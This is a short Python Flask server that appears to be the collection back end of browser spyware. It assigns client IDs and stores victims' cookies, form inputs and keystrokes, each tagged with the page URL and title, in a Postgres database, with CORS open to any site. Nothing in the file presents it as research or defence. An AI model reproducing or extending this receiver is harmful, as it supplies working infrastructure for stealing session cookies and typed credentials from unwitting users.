from db import *
from flask import Flask, request
from flask_cors import CORS
from json import dumps
from error import *
import psycopg2

app = Flask(__name__)
CORS(app)

conn = psycopg2.connect("dbname=server")
cur = conn.cursor()

# Get ID from db
@app.route("/create",methods=['GET'])
def createClient():
    return dumps({'id': db_newUser(cur)})

@app.route("/add/cookies", methods=['POST'])
def addCookies():
    try:
        package = request.get_json()
        if all (i in package for i in ("id","url","title","cookies")):
            db_addCookies(cur,package['id'],package['url'],package['title'],package['cookies'])
            conn.commit()
            return dumps({'success':True}), 200, {'ContentType':'application/json'} 
        else:
            raise InputError("Missing fields")
    except Exception as e:
        raise InputError(e)

@app.route("/add/input",methods=['POST'])
def addInput():
    try:
        package = request.get_json()
        if all (i in package for i in ("id","url","title","type","content")):
            db_addInput(cur,package['id'],package['url'],package['title'],package['type'],package['content'])
            conn.commit()
            return dumps({'success':True}), 200, {'ContentType':'application/json'} 
        else:
            raise InputError("Missing fields")
    except:
        raise InputError("Invalid Payload")

@app.route("/add/keystrokes",methods=['POST'])
def addKeystrokes():
    try:
        package = request.get_json()
        if all (i in package for i in ("id","url","title","content")):
            db_addKeystrokes(cur,package['id'],package['url'],package['title'],package['content'])
            conn.commit()
            return dumps({'success':True}), 200, {'ContentType':'application/json'} 
        else:
            raise InputError("Missing fields")
    except:
        raise InputError("Invalid Payload")


if __name__ == "__main__":
    app.run(port=3000)
